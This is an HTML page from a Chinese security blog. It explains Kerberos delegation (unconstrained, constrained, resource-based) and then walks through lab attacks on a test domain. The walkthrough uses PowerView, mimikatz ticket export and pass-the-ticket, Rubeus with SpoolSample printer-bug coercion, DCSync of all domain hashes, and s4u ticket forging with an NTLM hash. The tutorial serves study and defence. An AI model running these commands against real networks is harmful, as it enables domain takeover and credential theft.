@@ -1,0 +1,641 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.1.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    hostname: new URL('http://yoursite.com').hostname,
+    root: '/',
+    scheme: 'Mist',
+    version: '7.6.0',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},
+    copycode: {"enable":true,"show_result":true,"style":null},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    comments: {"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: 'search.xml',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}
+  };
+</script>
+
+  <meta name="description" content="用域委派打烂kerberos狗头">
+<meta property="og:type" content="article">
+<meta property="og:title" content="用域委派打烂kerberos狗头">
+<meta property="og:url" content="http://yoursite.com/2019/10/18/%E7%94%A8%E5%9F%9F%E5%A7%94%E6%B4%BE%E6%89%93%E7%83%82kerberos%E7%8B%97%E5%A4%B4/index.html">
+<meta property="og:site_name" content="李三的剑谱">
+<meta property="og:description" content="用域委派打烂kerberos狗头">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://yoursite.com/2019/10/18/%E7%94%A8%E5%9F%9F%E5%A7%94%E6%B4%BE%E6%89%93%E7%83%82kerberos%E7%8B%97%E5%A4%B4/1569681143411.png">
+<meta property="og:image" content="http://yoursite.com/2019/10/18/%E7%94%A8%E5%9F%9F%E5%A7%94%E6%B4%BE%E6%89%93%E7%83%82kerberos%E7%8B%97%E5%A4%B4/1570712520459.png">
+<meta property="og:image" content="http://yoursite.com/2019/10/18/%E7%94%A8%E5%9F%9F%E5%A7%94%E6%B4%BE%E6%89%93%E7%83%82kerberos%E7%8B%97%E5%A4%B4/1570712530920.png">
+<meta property="og:image" content="http://yoursite.com/2019/10/18/%E7%94%A8%E5%9F%9F%E5%A7%94%E6%B4%BE%E6%89%93%E7%83%82kerberos%E7%8B%97%E5%A4%B4/1569689280607.png">
+<meta property="og:image" content="http://yoursite.com/2019/10/18/%E7%94%A8%E5%9F%9F%E5%A7%94%E6%B4%BE%E6%89%93%E7%83%82kerberos%E7%8B%97%E5%A4%B4/1570709429377.png">
+<meta property="og:image" content="http://yoursite.com/2019/10/18/%E7%94%A8%E5%9F%9F%E5%A7%94%E6%B4%BE%E6%89%93%E7%83%82kerberos%E7%8B%97%E5%A4%B4/1570709452890.png">
+<meta property="og:image" content="http://yoursite.com/2019/10/18/%E7%94%A8%E5%9F%9F%E5%A7%94%E6%B4%BE%E6%89%93%E7%83%82kerberos%E7%8B%97%E5%A4%B4/1570709549303.png">
+<meta property="og:image" content="http://yoursite.com/2019/10/18/%E7%94%A8%E5%9F%9F%E5%A7%94%E6%B4%BE%E6%89%93%E7%83%82kerberos%E7%8B%97%E5%A4%B4/1570709591012.png">
+<meta property="og:image" content="http://yoursite.com/2019/10/18/%E7%94%A8%E5%9F%9F%E5%A7%94%E6%B4%BE%E6%89%93%E7%83%82kerberos%E7%8B%97%E5%A4%B4/1570709682895.png">
+<meta property="og:image" content="http://yoursite.com/2019/10/18/%E7%94%A8%E5%9F%9F%E5%A7%94%E6%B4%BE%E6%89%93%E7%83%82kerberos%E7%8B%97%E5%A4%B4/1570777540500.png">
+<meta property="og:image" content="http://yoursite.com/2019/10/18/%E7%94%A8%E5%9F%9F%E5%A7%94%E6%B4%BE%E6%89%93%E7%83%82kerberos%E7%8B%97%E5%A4%B4/1570850050489.png">
+<meta property="og:image" content="http://yoursite.com/2019/10/18/%E7%94%A8%E5%9F%9F%E5%A7%94%E6%B4%BE%E6%89%93%E7%83%82kerberos%E7%8B%97%E5%A4%B4/1570850068279.png">
+<meta property="og:image" content="http://yoursite.com/2019/10/18/%E7%94%A8%E5%9F%9F%E5%A7%94%E6%B4%BE%E6%89%93%E7%83%82kerberos%E7%8B%97%E5%A4%B4/1570868278901.png">
+<meta property="og:image" content="http://yoursite.com/2019/10/18/%E7%94%A8%E5%9F%9F%E5%A7%94%E6%B4%BE%E6%89%93%E7%83%82kerberos%E7%8B%97%E5%A4%B4/1570868800619.png">
+<meta property="og:image" content="http://yoursite.com/2019/10/18/%E7%94%A8%E5%9F%9F%E5%A7%94%E6%B4%BE%E6%89%93%E7%83%82kerberos%E7%8B%97%E5%A4%B4/1570871508561.png">
+<meta property="og:image" content="http://yoursite.com/2019/10/18/%E7%94%A8%E5%9F%9F%E5%A7%94%E6%B4%BE%E6%89%93%E7%83%82kerberos%E7%8B%97%E5%A4%B4/1570713945685.png">
+<meta property="og:image" content="http://yoursite.com/2019/10/18/%E7%94%A8%E5%9F%9F%E5%A7%94%E6%B4%BE%E6%89%93%E7%83%82kerberos%E7%8B%97%E5%A4%B4/1570701745743.png">
+<meta property="og:image" content="http://yoursite.com/2019/10/18/%E7%94%A8%E5%9F%9F%E5%A7%94%E6%B4%BE%E6%89%93%E7%83%82kerberos%E7%8B%97%E5%A4%B4/1570702323339.png">
+<meta property="og:image" content="http://yoursite.com/2019/10/18/%E7%94%A8%E5%9F%9F%E5%A7%94%E6%B4%BE%E6%89%93%E7%83%82kerberos%E7%8B%97%E5%A4%B4/1570702415606.png">
+<meta property="og:image" content="http://yoursite.com/2019/10/18/%E7%94%A8%E5%9F%9F%E5%A7%94%E6%B4%BE%E6%89%93%E7%83%82kerberos%E7%8B%97%E5%A4%B4/1570702431480.png">
+<meta property="og:image" content="http://yoursite.com/2019/10/18/%E7%94%A8%E5%9F%9F%E5%A7%94%E6%B4%BE%E6%89%93%E7%83%82kerberos%E7%8B%97%E5%A4%B4/1570702480513.png">
+<meta property="article:published_time" content="2019-10-17T16:00:00.000Z">
+<meta property="article:modified_time" content="2019-12-21T13:15:43.489Z">
+<meta property="article:author" content="李三（cl0und）">
+<meta property="article:tag" content="kerberos">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/2019/10/18/%E7%94%A8%E5%9F%9F%E5%A7%94%E6%B4%BE%E6%89%93%E7%83%82kerberos%E7%8B%97%E5%A4%B4/1569681143411.png">
+
+<link rel="canonical" href="http://yoursite.com/2019/10/18/%E7%94%A8%E5%9F%9F%E5%A7%94%E6%B4%BE%E6%89%93%E7%83%82kerberos%E7%8B%97%E5%A4%B4/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true
+  };
+</script>
+
+  <title>用域委派打烂kerberos狗头 | 李三的剑谱</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="李三的剑谱" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">李三的剑谱</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>Archives</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="none"
+           placeholder="Searching..." spellcheck="false"
+           type="text" id="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="en">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/10/18/%E7%94%A8%E5%9F%9F%E5%A7%94%E6%B4%BE%E6%89%93%E7%83%82kerberos%E7%8B%97%E5%A4%B4/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="李三（cl0und）">
+      <meta itemprop="description" content="人若无名，便可专心练剑">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="李三的剑谱">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          用域委派打烂kerberos狗头
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2019-10-18 00:00:00" itemprop="dateCreated datePublished" datetime="2019-10-18T00:00:00+08:00">2019-10-18</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2019-12-21 21:15:43" itemprop="dateModified" datetime="2019-12-21T21:15:43+08:00">2019-12-21</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/ad-security/" itemprop="url" rel="index">
+                    <span itemprop="name">ad security</span>
+                  </a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+                <span class="post-meta-item-text">Symbols count in article: </span>
+              <span>4.6k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+                <span class="post-meta-item-text">Reading time &asymp;</span>
+              <span>4 mins.</span>
+            </span>
+            <div class="post-description">用域委派打烂kerberos狗头</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="简单回顾Kerberos认证过程"><a href="#简单回顾Kerberos认证过程" class="headerlink" title="简单回顾Kerberos认证过程"></a>简单回顾Kerberos认证过程</h2><p>假设client想访问server</p>
+<ol>
+<li>client 向KDC-AS 发起预认证即NTLMhash加密的时间戳</li>
+<li>KDC-AS 验证身份后，发送client NTLMhash加密的短会话密钥seesionkey-a和krbtgt账户密码加密的TGT(TGT中也包含了sessionkey-a)</li>
+<li>client 用自己的NTLMhash解密拿到sessionkey-a，用sessionkey-a加密时间戳并发送加密的TGT给KDC-TGS</li>
+<li>KDC-TGS用krbtgt账户密码解密获取到sessionkey-a，并解密client发送的时间戳以此验明client身份。之后返回sessionkey-a加密的sessionkey-b和server的密码加密TGS（有的文章也称ST）</li>
+<li>client用sessionkey-a 解密拿到sessionkey-b，并用sessionkey-b加密时间戳一并和TGS发送给server</li>
+<li>server用自己的密码解密TGS拿到sessionkey-b解密时间戳以此验明client身份。返回sessionkey-b加密的时间戳给client，以此向client表明自己的身份（这里体现出Kerberos的双向验证）。</li>
+</ol>
+<h2 id="委派的场景"><a href="#委派的场景" class="headerlink" title="委派的场景"></a>委派的场景</h2><p>n1nty师傅的原话：用户 A 利用 Windows 身份验证访问了一个网站，请求网站内的一个文件，但是这个网站服务器本身并没有这个文件，它需要利用用户 A 的身份去访问另一台服务器，从另一台服务器上获取这个文件后再返回给用户。为什么网站会利用用户 A 的身份去获取文件，而不是直接利用网站自身的权限去获取呢？因为要充分利用 Windows 系统自身提供的权限控制啊，也许有的用户有权限访问那个文件而有的用户没有权限啊。</p>
+<h2 id="kerberos委派分类"><a href="#kerberos委派分类" class="headerlink" title="kerberos委派分类"></a>kerberos委派分类</h2><ul>
+<li>Forwardable TGT：Unconstrained delegation</li>
+<li>Proxy ticket：user 在访问 service1 的时候，提前把访问  service2 的票也申请好，并把这张票传递给 service1，然后  service1 就可以利用 user 的身份来访问  service2</li>
+<li>Constrained delegation：传统的约束委派</li>
+<li>Resource based delegation：基于资源的约束委派</li>
+</ul>
+<h2 id="非约束委派（Unconstrained-delegation）"><a href="#非约束委派（Unconstrained-delegation）" class="headerlink" title="非约束委派（Unconstrained delegation）"></a>非约束委派（Unconstrained delegation）</h2><p>假如server1主机账户配置了非约束委派，那么域账户A在对server1主机账户旗下服务service1（例如cifs服务）产生kerberos认证的时候（例如<code>dir \\server1\c$</code>）域账户会发送包含tgt的tgs给service1，然后service1就可以代表域账户A认证域内任何服务器。示意图如下<br><img src="./1569681143411.png" alt="Alt text"></p>
+<p>其攻击面是如果黑客控制了server1并在上面抓取了tgt就可以借此横向移动。</p>
+<h2 id="约束委派"><a href="#约束委派" class="headerlink" title="约束委派"></a>约束委派</h2><p>约束委派里面有两种重要的协议一种叫S4U2Proxy，一种叫S4U2Self。假如在给server1主机账户配置了委派到的server2 service2服务。那么当域用户A与server1旗下的service1发生kerberos认证的时候，service1可以拿域用户A给的tgs1从域控换到可以访问server2 service2的tgs2。在用tgs1换tgs2的过程中使用的协议就是S4U2Proxy。可是有可能用户A以其他方式(如NTLM认证，基于表单的认证等方式)与server service1 认证后用户没法提供tgs，那么service1就先需要使用S4U2Self从域控那里先换到自己服务的tgs1，再使用S4U2Proxy换可以访问server2 service2的tgs2。</p>
+<p>S4U2Proxy的示意图如下<br><img src="./1570712520459.png" alt="Alt text"></p>
+<p>S4U2Self的示意图如下<br><img src="./1570712530920.png" alt="Alt text"></p>
+<p>其攻击面是如果黑客控制了server1那么他可以伪造域内任意用户访问server2的service2</p>
+<h3 id="传统的约束委派"><a href="#传统的约束委派" class="headerlink" title="传统的约束委派"></a>传统的约束委派</h3><p>传统的约束委派是“正向的”，通过修改服务A属性<code>msDS-AllowedToDelegateTo</code>，添加服务B的SPN（Service Principle Name），设置约束委派对象（服务B），服务A便可以模拟用户向域控制器请求访问服务B以获得服务票据（TGS）来使用服务B的资源。</p>
+<h3 id="基于资源的约束委派"><a href="#基于资源的约束委派" class="headerlink" title="基于资源的约束委派"></a>基于资源的约束委派</h3><p>2012 及以后的KDC，受限委派的机制变成了基于资源的约束委派。基于资源的约束委派则是相反的，通过修改服务B属性<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>，添加服务A的SPN，达到让服务A模拟用户访问B资源的目的。</p>
+<p>两者联系与区别示意图如下<br><img src="./1569689280607.png" alt="Alt text"> </p>
+<h2 id="发现域内配置委派的账户"><a href="#发现域内配置委派的账户" class="headerlink" title="发现域内配置委派的账户"></a>发现域内配置委派的账户</h2><p>在域内的可以委派的账户有两种一种是主机账户（NetComputer）另一种是用setspn手动添加的服务账户（NetUser），上文中不管是非约束还是约束的例子是以主机账户举例，因为用主机账户来委派的环境好搭并且便于理解，不过服务账户和主机账户从攻击委派这个视角来看是等价的。</p>
+<p>检查非约束委派可以使用master版的PowerView<br><a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1" target="_blank" rel="noopener">https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Get-NetUser -Unconstrained -Domain beta.com</span><br><span class="line">Get-NetComputer -Unconstrained -Domain beta.com</span><br></pre></td></tr></table></figure>
+
+<p>检查约束委派可以使用开发版的PowerView<br><a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1" target="_blank" rel="noopener">https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Get-DomainUser -TrustedToAuth -Domain beta.com</span><br><span class="line">Get-DomainComputer -TrustedToAuth -Domain beta.com</span><br></pre></td></tr></table></figure>
+
+<h2 id="环境说明"><a href="#环境说明" class="headerlink" title="环境说明"></a>环境说明</h2><p>WIN-PMID8H9A6H0 192.168.3.2（域控， server2012）<br>exchange 192.168.3.3 (server2012)<br>database 192.168.3.4 (win10)<br>database2 192.168.3.5 (win7)</p>
+<h2 id="攻击非约束委派"><a href="#攻击非约束委派" class="headerlink" title="攻击非约束委派"></a>攻击非约束委派</h2><p>在WIN-PMID8H9A6H0上用与管理员账号登陆（这是一句废话，默认情况只有域管可以登陆域控），在Active Directory用户和计算机中，将computer组里面的database2选为<em>信任此计算机来委派任何服务即非约束委派</em>。然后在cmd中<code>dir \\database2\c$</code>。<br><img src="./1570709429377.png" alt="Alt text"></p>
+<p>在database2上用本地管理员登陆并用mimikatz抓取tickets</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::tickets &#x2F;export&quot; exit</span><br></pre></td></tr></table></figure>
+<p>可以看到域管理员传来的tgt<br><img src="./1570709452890.png" alt="Alt text"></p>
+<p>用mimikatz将域管理员的tgt导入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;kerberos::ptt [0;a4e7f]-2-0-60a10000-Administrator@krbtgt-BETA.COM.kirbi&quot; exit</span><br></pre></td></tr></table></figure>
+<p><img src="./1570709549303.png" alt="Alt text"><br><img src="./1570709591012.png" alt="Alt text"></p>
+<p>本地管理员成功访问域控<br><img src="./1570709682895.png" alt="Alt text"></p>
+<h2 id="攻击非约束委派（进阶）"><a href="#攻击非约束委派（进阶）" class="headerlink" title="攻击非约束委派（进阶）"></a>攻击非约束委派（进阶）</h2><p>上面利用非约束委派拿到域管账户的前提是需要域管账户和委派主机有过交互才能获取到TGT。当域控机器开启Print Spooler服务时(默认开启且以System权限运行)，攻击者可以主动要求域控访问已被攻击者控制的非受限委派服务器，进而获取域控主机账户的TGT。当然这种攻击方式也适用于其他非域控机器。<strong>但是这种攻击有一个限制是需要找到一台开启非受限委派的主机账户，而非服务账户并且有一个域普通账户</strong></p>
+<p><img src="./1570777540500.png" alt="Alt text"></p>
+<p>完成这一套攻击需要两个<a href="https://github.com/GhostPack/Rubeus" target="_blank" rel="noopener">Rubeus</a>和<a href="https://github.com/leechristensen/SpoolSample" target="_blank" rel="noopener">SpoolSample</a>的工具，Rubeus可以看作对kekeo的弥补，SpoolSample用户向DC2 Print Spooler发起请求。SpoolSample貌似只能用.net4.0以上的版本编译，所以这次就在win10上用了。<br>本地管理员运行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe monitor &#x2F;interval:5 &#x2F;filteruser:WIN-PMID8H9A6H0$</span><br></pre></td></tr></table></figure>
+<p><img src="./1570850050489.png" alt="Alt text"></p>
+<p>域普通账户运行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SpoolSample.exe WIN-PMID8H9A6H0 database2</span><br></pre></td></tr></table></figure>
+<p><img src="./1570850068279.png" alt="Alt text"><br>困惑的是这里报错了，查了报错码说是Print Spooler没开，但是明明开了的。。。<br>不过峰回路转的是database2 上可以抓到域控传来的tgt<br><img src="./1570868278901.png" alt="Alt text"><br><img src="./1570868800619.png" alt="Alt text"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt [0;a8543]-2-0-60a10000-WIN-PMID8H9A6H0$@krbtgt-BETA.COM.kirbi</span><br><span class="line">lsadump::dcsync &#x2F;domain:beta.com &#x2F;all &#x2F;csv</span><br></pre></td></tr></table></figure>
+<p><img src="./1570871508561.png" alt="Alt text"></p>
+<h2 id="攻击约束委派"><a href="#攻击约束委派" class="headerlink" title="攻击约束委派"></a>攻击约束委派</h2><p>域控上这么配置<br><img src="./1570713945685.png" alt="Alt text"></p>
+<p>在database2上用mimikatz抓取主机账户htlm hash（主机账户即hostname$）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonpasswords full</span><br></pre></td></tr></table></figure>
+<p><img src="./1570701745743.png" alt="Alt text"></p>
+<p>用拿到的ntlm hash申请tgt</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tgt::ask &#x2F;user:database2$ &#x2F;domain:beta.com &#x2F;ntlm:65118c9246cada2aa3e1a366f3ed06cf</span><br></pre></td></tr></table></figure>
+<p><img src="./1570702323339.png" alt="Alt text"></p>
+<p><em>ps：其实抓hash和kekeo的操作在拥有database2主机权限下都是多余的操作。这里为了完整性写出来，其实际意义在于在实战中通过其他方式例如爆破获取了服务账号的密码（服务账号的密码是管理员自己设置所以可能是弱口令，至于主机账户的密码上上张图你也看到了长的过分）的情况下进行约束委派攻击。</em></p>
+<p>获取访问exchange cifs服务的tgs（tgs是域管权限）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tgs::s4u &#x2F;tgt:TGT_database2$@BETA.COM_krbtgt~beta.com@BETA.COM.kirbi &#x2F;user:Administrator@beta.com &#x2F;service:cifs&#x2F;exchange.beta.com</span><br></pre></td></tr></table></figure>
+<p><img src="./1570702415606.png" alt="Alt text"></p>
+<p>将tgs导入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt TGS_Administrator@beta.com@BETA.COM_cifs~exchange.beta.com@BETA.COM.kirbi</span><br></pre></td></tr></table></figure>
+<p><img src="./1570702431480.png" alt="Alt text"></p>
+<p>以本地管理员身份假装域管访问exchange smb<br><img src="./1570702480513.png" alt="Alt text"></p>
+<h2 id="杂"><a href="#杂" class="headerlink" title="杂"></a>杂</h2><ul>
+<li>默认情况下普通域用户只能登陆域中的PC不能登陆域中server</li>
+<li>tgt使用与域账号无关，本地账户仍然可以使用tgt</li>
+<li>tgt是从本质来说是krbtgt服务的tgs</li>
+</ul>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://uknowsec.cn/posts/notes/%E5%9F%9F%E6%B8%97%E9%80%8F-Delegation.html" target="_blank" rel="noopener">域渗透-Delegation</a><br><a href="http://blog.nsfocus.net/analysis-attacks-entitlement-resource-constrained-delegation/" target="_blank" rel="noopener">利用资源约束委派进行的提权攻击分析</a><br><a href="https://paper.seebug.org/620/" target="_blank" rel="noopener">利用 Kerberos delegation 打造变种黄金票据</a><br><a href="https://pathowe.co.uk/delegation-between-servers-windows-authenticated-sites/" target="_blank" rel="noopener">Setting up delegation between servers for Windows authenticated sites</a><br><a href="https://xz.aliyun.com/t/2931" target="_blank" rel="noopener">Attacking Kerberos Delegation</a><br><a href="https://github.com/Nu1LCTF/n1ctf-2019/blob/master/WEB/Pentest_N1CTF2019.lab/README.md" target="_blank" rel="noopener">N1CTF 2019 Pentest N1ctf2019.lab WP</a><br><a href="https://blogs.msdn.microsoft.com/apgcdsd/2011/09/26/kerberosntlm-sql-server/" target="_blank" rel="noopener">Kerberos和NTLM – SQL Server连接的那点事</a><br><a href="https://blog.csdn.net/yxwmzouzou/article/details/79002677" target="_blank" rel="noopener">SQL Server 只安装客户端的方法</a></p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:  </strong>李三（cl0und）
+  </li>
+  <li class="post-copyright-link">
+    <strong>Post link: </strong>
+    <a href="http://yoursite.com/2019/10/18/%E7%94%A8%E5%9F%9F%E5%A7%94%E6%B4%BE%E6%89%93%E7%83%82kerberos%E7%8B%97%E5%A4%B4/" title="用域委派打烂kerberos狗头">http://yoursite.com/2019/10/18/用域委派打烂kerberos狗头/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/kerberos/" rel="tag"># kerberos</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2019/10/02/fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E7%A1%AC%E6%A0%B8%E8%B7%9F%E8%B8%AA/" rel="prev" title="fastjson 反序列化流程硬核跟踪">
+      <i class="fa fa-chevron-left"></i> fastjson 反序列化流程硬核跟踪
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2019/10/25/CobaltStrike%20External%20C2%E4%BF%A1%E9%81%93/" rel="next" title="CobaltStrike External C2信道">
+      CobaltStrike External C2信道 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let activeClass = CONFIG.comments.activeClass;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
